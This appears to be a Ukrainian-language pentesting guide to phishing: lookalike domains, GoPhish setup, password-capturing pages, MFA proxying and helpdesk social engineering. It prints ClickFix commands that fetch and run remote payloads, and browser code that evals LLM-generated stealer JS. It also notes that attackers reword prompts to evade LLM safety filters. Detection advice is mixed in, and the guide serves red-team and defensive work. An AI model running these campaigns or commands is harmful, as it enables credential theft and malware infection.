# Методологія фішингу

## Методологія

1. Проведіть Recon жертви
1. Виберіть **домен жертви**.
2. Виконайте базове веб-перерахування, **шукаючи портали входу**, які використовує жертва, і **вирішіть**, який із них ви будете **імперсонувати**.
3. Використайте **OSINT**, щоб **знайти email-адреси**.
2. Підготуйте середовище
1. **Придбайте домен**, який ви будете використовувати для фішингової оцінки
2. **Налаштуйте пов'язані записи email-сервісу** (SPF, DMARC, DKIM, rDNS)
3. Налаштуйте VPS із **gophish**
3. Підготуйте кампанію
1. Підготуйте **шаблон email**
2. Підготуйте **вебсторінку** для викрадення облікових даних
4. Запустіть кампанію!

## Генерування схожих доменних імен або придбання довіреного домену

### Методи варіації доменних імен

- **Keyword**: Доменне ім'я **містить** важливе **ключове слово** оригінального домену (наприклад, zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Замініть **крапку на дефіс** у субдомені (наприклад, www-zelster.com).
- **New TLD**: Той самий домен із використанням **нового TLD** (наприклад, zelster.org)
- **Homoglyph**: **Замінює** літеру в доменному імені на **літери, що мають схожий вигляд** (наприклад, zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Міняє місцями дві літери** в доменному імені (наприклад, zelsetr.com).
- **Singularization/Pluralization**: Додає або видаляє «s» у кінці доменного імені (наприклад, zeltsers.com).
- **Omission**: **Видаляє одну** з літер доменного імені (наприклад, zelser.com).
- **Repetition:** **Повторює одну** з літер доменного імені (наприклад, zeltsser.com).
- **Replacement**: Подібний до Homoglyph, але менш непомітний. Замінює одну з літер доменного імені, можливо, на літеру, розташовану поруч із початковою літерою на клавіатурі (наприклад, zektser.com).
- **Subdomained**: Додає **крапку** всередину доменного імені (наприклад, ze.lster.com).
- **Insertion**: **Вставляє літеру** в доменне ім'я (наприклад, zerltser.com).
- **Missing dot**: Додає TLD до доменного імені (наприклад, zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Існує **ймовірність, що деякі біти, які зберігаються або передаються, можуть автоматично змінитися** через різні фактори, як-от сонячні спалахи, космічні промені або апаратні помилки.

Коли цю концепцію **застосовують до DNS-запитів**, можливо, що **домен, отриманий DNS-сервером**, не збігається з доменом, який спочатку запитували.

Наприклад, зміна одного біта в домені «windows.com» може перетворити його на «windnws.com».

Зловмисники можуть **скористатися цим, зареєструвавши кілька доменів із bit-flipping**, схожих на домен жертви. Їхня мета — перенаправити легітимних користувачів на власну інфраструктуру.

Докладніше читайте на [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Придбання довіреного домену

На [https://www.expireddomains.net/](https://www.expireddomains.net) можна знайти домен із завершеним терміном реєстрації, який можна використати.\
Щоб переконатися, що домен із завершеним терміном реєстрації, який ви збираєтеся придбати, **вже має хороші показники SEO**, можна перевірити, як його класифіковано на таких ресурсах:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Пошук email-адрес

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% безкоштовно)
- [https://phonebook.cz/](https://phonebook.cz) (100% безкоштовно)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Щоб **знайти більше** дійсних email-адрес або **перевірити ті, які** ви вже знайшли, можна перевірити, чи вдасться виконати brute-force проти SMTP-серверів жертви. [Дізнайтеся тут, як перевіряти/знаходити email-адреси](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Крім того, не забувайте: якщо користувачі використовують **вебпортал для доступу до пошти**, можна перевірити, чи є він вразливим до **username brute force**, і за можливості експлуатувати вразливість.

## Налаштування GoPhish

### Встановлення

Завантажити його можна з [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Завантажте та розпакуйте його в `/opt/gophish`, а потім виконайте `/opt/gophish/gophish`\
У виведенні буде надано пароль для admin-користувача на порту 3333. Перейдіть на цей порт і використайте ці облікові дані, щоб змінити пароль admin-користувача. Можливо, вам знадобиться тунелювати цей порт на локальний:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Налаштування

**Налаштування сертифіката TLS**

До цього кроку ви вже повинні **придбати домен**, який збираєтеся використовувати, і він має **вказувати** на **IP-адресу VPS**, де ви налаштовуєте **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Конфігурація пошти**

Почніть встановлення: `apt-get install postfix`

Потім додайте домен до таких файлів:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Також змініть значення таких змінних у /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Нарешті змініть файли **`/etc/hostname`** і **`/etc/mailname`**, вказавши ім’я вашого домену, і **перезапустіть VPS.**

Тепер створіть **DNS A-запис** для `mail.<domain>`, що вказує на **IP-адресу** VPS, і **DNS MX-запис**, що вказує на `mail.<domain>`

Тепер перевіримо надсилання електронного листа:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Конфігурація Gophish**

Зупиніть виконання gophish і налаштуймо його.\
Змініть `/opt/gophish/config.json` на наведений нижче варіант (зверніть увагу на використання https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Налаштування служби gophish**

Щоб створити службу gophish, яку можна буде автоматично запускати та керувати нею як службою, створіть файл `/etc/init.d/gophish` із таким вмістом:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Завершіть налаштування служби та перевірте її, виконавши:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Налаштування поштового сервера та домену

### Зачекайте та будьте легітимними

Чим старший домен, тим менша ймовірність, що його буде позначено як spam. Тому перед phishing assessment слід зачекати якомога довше (щонайменше 1 тиждень). Крім того, якщо розмістити на сторінці інформацію про сектор із хорошою репутацією, отримана репутація буде кращою.

Зверніть увагу, що навіть якщо потрібно зачекати тиждень, ви можете завершити налаштування всього вже зараз.

### Налаштування запису Reverse DNS (rDNS)

Установіть запис rDNS (PTR), який зіставляє IP-адресу VPS з доменним ім’ям.

### Запис Sender Policy Framework (SPF)

Ви повинні **налаштувати запис SPF для нового домену**. Якщо ви не знаєте, що таке запис SPF, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Для генерації політики SPF можна використати [https://www.spfwizard.net/](https://www.spfwizard.net) (використайте IP-адресу VPS)

![Форма SPF Wizard для генерації запису SPF для phishing-домену](<../../images/image (1037).png>)

Це вміст, який потрібно встановити всередині запису TXT у домені:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Автентифікація повідомлень на основі домену, звітність і відповідність (DMARC)

Ви повинні **налаштувати DMARC-запис для нового домену**. Якщо ви не знаєте, що таке DMARC-запис, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Вам потрібно створити новий DNS TXT-запис, що вказує на hostname `_dmarc.<domain>`, із таким вмістом:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Ви повинні **налаштувати DKIM для нового домену**. Якщо ви не знаєте, що таке запис DMARC, [**прочитайте цю сторінку**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Цей посібник створено на основі: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Вам потрібно об'єднати обидва значення B64, які генерує ключ DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Перевірте оцінку конфігурації електронної пошти

Це можна зробити за допомогою [https://www.mail-tester.com/](https://www.mail-tester.com)\
Просто відкрийте сторінку та надішліть електронний лист на вказану ними адресу:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Ви також можете **перевірити конфігурацію електронної пошти**, надіславши листа на `check-auth@verifier.port25.com` і **прочитавши відповідь** (для цього потрібно **відкрити** порт **25** і переглянути відповідь у файлі _/var/mail/root_, якщо ви надсилаєте листа від імені root).\
Переконайтеся, що ви пройшли всі тести:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Ви також можете надіслати **повідомлення до Gmail під вашим контролем** і перевірити **заголовки електронного листа** у своїй поштовій скриньці Gmail: у полі заголовка `Authentication-Results` має бути присутнє `dkim=pass`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Видалення зі Spamhouse Blacklist

Сторінка [www.mail-tester.com](https://www.mail-tester.com) може повідомити, чи заблоковано ваш домен Spamhouse. Ви можете запросити видалення свого домену/IP за адресою: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Видалення з Microsoft Blacklist

​​Ви можете запросити видалення свого домену/IP за адресою [https://sender.office.com/](https://sender.office.com).

## Створення та запуск кампанії GoPhish

### Sending Profile

- Вкажіть **назву для ідентифікації** профілю відправника
- Визначте, з якого облікового запису ви надсилатимете phishing emails. Варіанти: _noreply, support, servicedesk, salesforce..._
- Поля імені користувача та пароля можна залишити порожніми, але обов’язково встановіть прапорець Ignore Certificate Errors

![Створення та запуск кампанії GoPhish - Sending Profile: Поля імені користувача та пароля можна залишити порожніми, але обов’язково встановіть прапорець Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Рекомендується використовувати функцію "**Send Test Email**", щоб перевірити, чи все працює.\
> Я рекомендую **надсилати тестові листи на адреси 10min mail**, щоб уникнути потрапляння до blacklist під час тестування.

### Email Template

- Вкажіть **назву для ідентифікації** шаблону
- Потім напишіть **тему** (нічого дивного, просто те, що ви очікували б побачити у звичайному email)
- Переконайтеся, що встановлено прапорець "**Add Tracking Image**"
- Напишіть **шаблон email** (можна використовувати змінні, як у наведеному нижче прикладі):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Зверніть увагу, що **для підвищення достовірності електронного листа** рекомендується використати підпис із листа клієнта. Варіанти:

- Надішліть електронний лист на **неіснуючу адресу** та перевірте, чи містить відповідь підпис.
- Знайдіть **публічні електронні адреси**, наприклад info@ex.com, press@ex.com або public@ex.com, надішліть їм листа та дочекайтеся відповіді.
- Спробуйте зв’язатися з **якоюсь дійсною знайденою** електронною адресою та дочекайтеся відповіді.

![Профіль надсилання - Шаблон електронного листа: спробуйте зв’язатися з якоюсь дійсною знайденою електронною адресою та дочекайтеся відповіді](<../../images/image (80).png>)

> [!TIP]
> Шаблон електронного листа також дає змогу **додавати файли для надсилання**. Якщо ви також хочете викрадати NTLM challenges за допомогою спеціально створених файлів/документів, [прочитайте цю сторінку](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Вкажіть **назву**
- **Напишіть HTML-код** вебсторінки. Зверніть увагу, що вебсторінки можна **імпортувати**.
- Встановіть прапорці **Capture Submitted Data** і **Capture Passwords**
- Налаштуйте **перенаправлення**

![Шаблон електронного листа - Landing Page: встановіть прапорці Capture Submitted Data і Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Зазвичай потрібно змінити HTML-код сторінки та виконати кілька локальних тестів (можливо, використовуючи сервер Apache), **доки результат вас не задовольнить.** Потім вставте цей HTML-код у поле.\
> Якщо вам потрібно **використовувати статичні ресурси** для HTML (наприклад, CSS- і JS-сторінки), їх можна зберегти в _**/opt/gophish/static/endpoint**_, а потім отримати до них доступ через _**/static/\<filename>**_

> [!TIP]
> Для перенаправлення можна **перенаправити користувачів на легітимну головну вебсторінку** жертви або, наприклад, перенаправити їх до _/static/migration.html_, додати **індикатор завантаження (**[**https://loading.io/**](https://loading.io)**) на 5 секунд, а потім повідомити, що процес успішно завершено**.

### Users & Groups

- Вкажіть назву
- **Імпортуйте дані** (зверніть увагу, що для використання шаблону в цьому прикладі потрібно вказати ім’я, прізвище та електронну адресу кожного користувача)

![Landing Page - Users & Groups: імпортуйте дані (зверніть увагу, що для використання шаблону в цьому прикладі потрібно вказати ім’я, прізвище та електронну адресу кожного користувача)](<../../images/image (163).png>)

### Campaign

Нарешті, створіть кампанію, вибравши назву, шаблон електронного листа, Landing Page, URL, профіль надсилання та групу. Зверніть увагу, що URL буде посиланням, надісланим жертвам.

Зверніть увагу, що **Sending Profile дає змогу надіслати тестовий лист, щоб перевірити, як виглядатиме підсумковий phishing-лист**:

![Users & Groups - Campaign: зверніть увагу, що Sending Profile дає змогу надіслати тестовий лист, щоб перевірити, як виглядатиме підсумковий phishing-лист](<../../images/image (192).png>)

Коли все буде готово, просто запустіть кампанію!

## Клонування вебсайту

Якщо з будь-якої причини ви хочете клонувати вебсайт, перегляньте цю сторінку:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

У деяких phishing-оцінюваннях (переважно для Red Teams) ви також можете захотіти **надсилати файли, що містять певний backdoor** (можливо, C2 або просто щось, що ініціює автентифікацію).\
Перегляньте цю сторінку, щоб ознайомитися з прикладами:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Через Proxy MitM

Попередня атака є досить хитрою, оскільки ви імітуєте справжній вебсайт і збираєте введену користувачем інформацію. На жаль, якщо користувач ввів неправильний пароль або якщо підроблений вами застосунок налаштований із 2FA, **ця інформація не дасть змоги видати себе за обманутого користувача**.

Саме тут корисні такі інструменти, як [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) та [**muraena**](https://github.com/muraenateam/muraena). Цей інструмент дає змогу створювати атаку типу MitM. Загалом атака працює так:

1. Ви **імітуєте форму входу** справжньої вебсторінки.
2. Користувач **надсилає** свої **облікові дані** на вашу підроблену сторінку, а інструмент надсилає їх на справжню вебсторінку, **перевіряючи, чи працюють облікові дані**.
3. Якщо обліковий запис налаштований із **2FA**, сторінка MitM попросить ввести цей код, і після того, як **користувач введе** його, інструмент надішле код на справжню вебсторінку.
4. Після автентифікації користувача ви (як зловмисник) отримаєте **облікові дані, 2FA, cookie та будь-яку інформацію**, отриману під час кожної взаємодії, поки інструмент виконує MitM.

### Через VNC

Що, якби замість **перенаправлення жертви на шкідливу сторінку** з таким самим виглядом, як у оригінальної, ви перенаправили її до **сеансу VNC із браузером, підключеним до справжньої вебсторінки**? Ви зможете бачити, що вона робить, викрасти пароль, використану MFA, cookie тощо.\
Це можна зробити за допомогою [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Виявлення виявлення

Очевидно, один із найкращих способів дізнатися, чи вас викрили, — **перевірити свій домен у чорних списках**. Якщо його внесено до списку, це означає, що ваш домен певним чином розпізнали як підозрілий.\
Один із простих способів перевірити, чи є ваш домен у чорному списку, — скористатися [https://malwareworld.com/](https://malwareworld.com)

Однак існують й інші способи дізнатися, чи жертва **активно шукає підозрілу phishing-активність у відкритому середовищі**, як описано тут:


{{#ref}}
detecting-phising.md
{{#endref}}

Ви можете **придбати домен із дуже схожою назвою** на домен жертви **та/або створити сертифікат** для **піддомену** домену під вашим контролем, що **містить** **ключове слово** з домену жертви. Якщо **жертва** виконає з ним будь-яку **DNS- або HTTP-взаємодію**, ви дізнаєтеся, що **вона активно шукає** підозрілі домени, і вам потрібно буде діяти дуже непомітно.<sup>[[2]](#references)</sup>

### Оцінювання phishing

Використовуйте [**Phishious** ](https://github.com/Rices/Phishious), щоб оцінити, чи потрапить ваш лист до папки зі спамом, чи його буде заблоковано, або ж він буде успішним.

## Компрометація ідентичності з активною взаємодією (скидання MFA через службу підтримки)

Сучасні intrusion sets дедалі частіше повністю оминають email-приманки та **безпосередньо атакують workflow служби підтримки / відновлення ідентичності**, щоб обійти MFA. Атака повністю працює за принципом "living-off-the-land": отримавши дійсні облікові дані, оператор переміщується за допомогою вбудованих admin-інструментів — malware не потрібен.<sup>[[6]](#references)</sup>

### Сценарій атаки
1. Розвідка жертви
* Збирайте особисті та корпоративні відомості з LinkedIn, витоків даних, публічного GitHub тощо.
* Визначте важливі ідентичності (керівники, IT, фінанси) та з’ясуйте **точний процес служби підтримки** для скидання пароля / MFA.
2. Соціальна інженерія в реальному часі
* Зателефонуйте, напишіть у Teams або чатіться зі службою підтримки, видаючи себе за ціль (часто використовуючи **підроблений caller-ID** або **клонований голос**).
* Надайте попередньо зібрані PII, щоб пройти перевірку на основі контрольних запитань.
* Переконайте агента **скинути секрет MFA** або виконати **SIM-swap** для зареєстрованого мобільного номера.
3. Негайні дії після отримання доступу (≤60 хв у реальних випадках)
* Закріпіть початковий доступ через будь-який вебпортал SSO.
* Перелічіть AD / AzureAD за допомогою вбудованих засобів (без завантаження бінарних файлів):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Виконайте lateral movement за допомогою **WMI**, **PsExec** або легітимних агентів **RMM**, які вже дозволені в середовищі.

### Виявлення та пом’якшення
* Розглядайте відновлення ідентичності через службу підтримки як **привілейовану операцію** — вимагайте step-up authentication і погодження менеджера.
* Розгорніть правила **Identity Threat Detection & Response (ITDR)** / **UEBA**, які сповіщають про:
* Зміну методу MFA + автентифікацію з нового пристрою / географічного розташування.
* Негайне підвищення привілеїв того самого principal (user-→-admin).
* Записуйте дзвінки до служби підтримки та вимагайте **зворотного дзвінка на вже зареєстрований номер** перед будь-яким скиданням.
* Реалізуйте **Just-In-Time (JIT) / Privileged Access**, щоб щойно скинуті облікові записи **не успадковували автоматично токени з високими привілеями**.

---

## Deception у масштабі — SEO Poisoning і кампанії “ClickFix”
Commodity crews компенсують вартість операцій із активною взаємодією за допомогою масових атак, які перетворюють **пошукові системи та рекламні мережі на канал доставки**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** просуває підроблений результат, наприклад `chromium-update[.]site`, на перше місце серед пошукових оголошень.
2. Жертва завантажує невеликий **first-stage loader** (часто JS/HTA/ISO). Приклади, зафіксовані Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader викрадає cookie браузера та credential DB, а потім завантажує **silent loader**, який *у режимі реального часу* вирішує, що розгорнути:
* RAT (наприклад, AsyncRAT, RustDesk)
* ransomware / wiper
* компонент persistence (ключ Run у реєстрі + scheduled task)

### Поради з hardening
* Блокуйте новозареєстровані домени та застосовуйте **Advanced DNS / URL Filtering** також до *пошукової реклами*, а не лише до електронної пошти.
* Обмежте встановлення програм підписаними MSI / Store-пакетами, забороніть виконання `HTA`, `ISO`, `VBS` за допомогою політик.
* Відстежуйте дочірні процеси браузерів, які відкривають інсталятори:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Шукайте LOLBins, якими часто зловживають first-stage loaders (наприклад, `regsvr32`, `curl`, `mshta`).

### Hijacking натискання кнопки завантаження з передаванням до TDS
Деякі підроблені портали програмного забезпечення залишають видимий `href` завантаження, що вказує на **справжню URL-адресу GitHub/release**, але перехоплюють **першу** взаємодію користувача в JavaScript і натомість спрямовують жертву до ланцюжка **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Ключові ознаки:
- Хук зазвичай запускається у **capture phase** (`true`) на `document`, тому спрацьовує раніше за обробники сайту.
- Chrome часто використовує `mousedown` замість `click`, щоб прив'язати redirect до дійсного **user gesture** і покращити обхід блокувальника спливаючих вікон.
- Деякі варіанти заздалегідь відкривають `about:blank` або імітують кліки по `<a target="_blank">`, а URL TDS призначають лише пізніше.
- Обмеження на стороні браузера часто зберігаються в `localStorage`, тому **перший клік** може перенаправити до malware, а після оновлень/повторних спроб відбувається повернення до видимого посилання, що виглядає безпечним.
- TDS може фільтрувати за referrer, доменом входу, GEO, відбитком браузера/пристрою, перевірками VPN/datacenter, контекстом кліку та лічильниками для кожної сесії, через що повторення аналітиком є недетермінованим.

Ідеї для захисників:
- Порівнюйте **відображуваний** `href` із **фактичною** ціллю навігації, яка генерується під час кліку.
- Шукайте обробники `document.addEventListener(..., true)`, які викликають одночасно `preventDefault()` і `stopImmediatePropagation()` у зв'язці з `window.open`, `about:blank` або імітованими кліками по anchor.
- Розглядайте кластери нещодавно зареєстрованих доменів для завантаження програмного забезпечення, які всі завантажують однаковий CloudFront/JS stage, як високосигнальний патерн SEO-poisoning/TDS.

### ClickFix із фальшивих сторінок перевірки + LOLBAS fetch-и, що виглядають як архіви
Деякі гілки TDS завершуються фальшивою сторінкою перевірки (у стилі Cloudflare/IUAM), яка пропонує жертві запустити довірений Windows бінарний файл, наприклад:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Примітки:
- `mshta.exe` виконує **HTA/VBScript на початку відповіді**, навіть якщо URL видає себе за архів `.7z`; додані дані архіву можуть бути лише чистою приманкою.
- Наступні етапи часто продовжують брехати про тип файлу (`.rtf` для PowerShell, `.asar` для Python, ZIP-архіви з доповненими бінарними файлами), а потім переходять до **ручного PE-мапінгу / виконання в пам’яті**.
- Якщо ви реагуєте на один із таких ланцюжків, зберігайте **мережеві дані та дані з пам’яті від першого успішного запуску**: подальші повторні відтворення можуть показувати лише нешкідливий шлях інсталятора/SFX або завершуватися невдало, оскільки видача payload/key була прив’язана до оригінальної TDS-сесії.

### ClickFix DLL delivery tradecraft (fake CERT update)
* Приманка: клонована рекомендація національного CERT з кнопкою **Update**, яка відображає покрокові інструкції щодо «виправлення». Жертвам повідомляють, що потрібно запустити batch-файл, який завантажує DLL і виконує її через `rundll32`.<sup>[[12]](#references)</sup>
* Типовий ланцюжок batch-файлу:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` зберігає payload у `%TEMP%`, коротка затримка приховує мережевий джиттер, після чого `rundll32` викликає експортовану точку входу (`notepad`).
* DLL передає ідентифікаційні дані хоста та кожні кілька хвилин опитує C2. Віддалені завдання надходять як **закодований у base64 PowerShell**, який виконується приховано та з обходом політик:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Це зберігає гнучкість C2 (сервер може змінювати завдання без оновлення DLL) і приховує вікна консолі. Шукайте дочірні процеси PowerShell у `rundll32.exe`, які одночасно використовують `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Захисники можуть шукати HTTP(S)-зворотні підключення у форматі `...page.php?tynor=<COMPUTER>sss<USER>` та 5-хвилинні інтервали опитування після завантаження DLL.

---

## AI-Enhanced Phishing Operations
Зловмисники тепер поєднують **LLM і voice-clone API** для повністю персоналізованих приманок та взаємодії в реальному часі.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Генерування та надсилання понад 100 тис. email / SMS із рандомізованими формулюваннями та tracking links.|
|Generative AI|Створення *одноразових* email-повідомлень із посиланнями на публічні M&A, внутрішні жарти із social media; deep-fake голос CEO у callback scam.|
|Agentic AI|Автономна реєстрація доменів, збір open-source intel, підготовка наступних email-повідомлень, коли жертва натискає посилання, але не надсилає облікові дані.|

**Захист:**
• Додайте **dynamic banners**, що виділяють повідомлення, надіслані через ненадійну automation (за допомогою аномалій ARC/DKIM).
• Впровадьте **voice-biometric challenge phrases** для телефонних запитів із високим ризиком.
• Постійно імітуйте приманки, згенеровані AI, у програмах підвищення обізнаності — статичні шаблони застаріли.

Див. також — agentic browsing abuse для credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Див. також — AI agent abuse of local CLI tools and MCP (для інвентаризації секретів і виявлення):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Зловмисники можуть поширювати HTML, що виглядає нешкідливо, і **генерувати stealer під час виконання**, запитуючи JavaScript у **trusted LLM API**, а потім виконуючи його в браузері (наприклад, через `eval` або динамічний `<script>`).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** кодування URL для exfil/Base64-рядків у prompt; ітеративна зміна формулювань для обходу фільтрів безпеки та зменшення кількості hallucinations.
2. **Client-side API call:** під час завантаження JS викликає публічний LLM (Gemini/DeepSeek/etc.) або CDN proxy; у статичному HTML присутні лише prompt/API call.
3. **Assemble & exec:** конкатенація відповіді та її виконання (поліморфний код під час кожного відвідування):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** згенерований код персоналізує lure (наприклад, через парсинг токенів LogoKit) і надсилає creds на endpoint, прихований у prompt.

**Ознаки ухилення**
- Трафік спрямовується до відомих доменів LLM або надійних CDN-проксі; іноді через WebSockets до backend.
- Статичний payload відсутній; шкідливий JS існує лише після render.
- Недетерміновані генерації створюють **унікальні stealers для кожної сесії**.

